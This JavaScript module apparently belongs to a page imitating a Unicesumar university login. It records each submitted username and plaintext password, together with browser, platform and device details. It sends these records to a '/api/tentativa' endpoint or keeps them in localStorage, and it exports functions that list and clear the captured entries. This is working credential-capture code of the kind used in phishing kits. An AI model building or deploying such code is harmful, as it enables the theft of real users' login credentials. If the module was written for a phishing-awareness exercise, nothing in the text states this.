const STORAGE_KEY = "unicesumar-ws-tentativas";
const MAX_IDADE_MS = 10 * 60 * 1000;
const LIMPEZA_INTERVALO_MS = 60 * 1000;
const CACHE_BACKEND_OK_MS = 30 * 1000;
const CACHE_BACKEND_FAIL_MS = 60 * 1000;

let backendDisponivel = null;
let backendVerificadoEm = 0;

function novoId() {
  if (typeof globalThis.crypto?.randomUUID === "function") {
    return globalThis.crypto.randomUUID();
  }
  return `${Date.now()}-${Math.random().toString(36).slice(2, 11)}`;
}

function lerLocal() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
  } catch {
    return [];
  }
}

function salvarLocal(itens) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(itens));
}

function filtrarRecentes(itens) {
  const limite = Date.now() - MAX_IDADE_MS;
  return itens.filter((item) => new Date(item.dataHora).getTime() > limite);
}

function limparAntigasLocal() {
  const filtrado = filtrarRecentes(lerLocal());
  salvarLocal(filtrado);
  return filtrado;
}

if (typeof window !== "undefined") {
  limparAntigasLocal();
  setInterval(limparAntigasLocal, LIMPEZA_INTERVALO_MS);
}

function invalidarBackend() {
  backendDisponivel = false;
  backendVerificadoEm = Date.now();
}

function detectarNavegador(ua) {
  const agent = (ua || (typeof navigator !== "undefined" ? navigator.userAgent : "")).toLowerCase();
  if (/firefox|fxios/.test(agent)) return "Mozilla";
  if (/chrome|crios|chromium|edg|opr/.test(agent)) return "Chrome";
  if (/safari/.test(agent)) return "Safari";
  return "Outro";
}

function criarEvento(usuario, senha) {
  const mobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
  return {
    id: novoId(),
    usuario: String(usuario),
    senha: String(senha),
    navegador: detectarNavegador(),
    sistema: navigator.platform || "desconhecido",
    dispositivo: mobile ? "Mobile" : "Desktop",
    ip: "local (navegador)",
    dataHora: new Date().toISOString(),
  };
}

async function usarBackend() {
  const agora = Date.now();
  if (backendDisponivel !== null) {
    const ttl = backendDisponivel ? CACHE_BACKEND_OK_MS : CACHE_BACKEND_FAIL_MS;
    if (agora - backendVerificadoEm < ttl) {
      return backendDisponivel;
    }
  }

  try {
    const res = await fetch("/api/health");
    backendDisponivel = res.ok;
  } catch {
    backendDisponivel = false;
  }

  backendVerificadoEm = agora;
  return backendDisponivel;
}

async function fetchBackend(path, options) {
  const res = await fetch(path, options);
  if (!res.ok) {
    invalidarBackend();
    throw new Error("Falha na API");
  }
  return res;
}

export async function registrarTentativa(usuario, senha) {
  if (await usarBackend()) {
    try {
      await fetchBackend("/api/tentativa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ usuario, senha }),
      });
      return;
    } catch {
      // cai no localStorage abaixo
    }
  }

  const evento = criarEvento(usuario, senha);
  salvarLocal([evento, ...limparAntigasLocal()]);
}

export async function listarTentativas() {
  if (await usarBackend()) {
    try {
      const res = await fetchBackend("/api/tentativas");
      return res.json();
    } catch {
      // cai no localStorage abaixo
    }
  }
  return limparAntigasLocal();
}

export async function limparTentativas() {
  if (await usarBackend()) {
    try {
      await fetchBackend("/api/tentativas", { method: "DELETE" });
      return;
    } catch {
      // cai no localStorage abaixo
    }
  }
  salvarLocal([]);
}
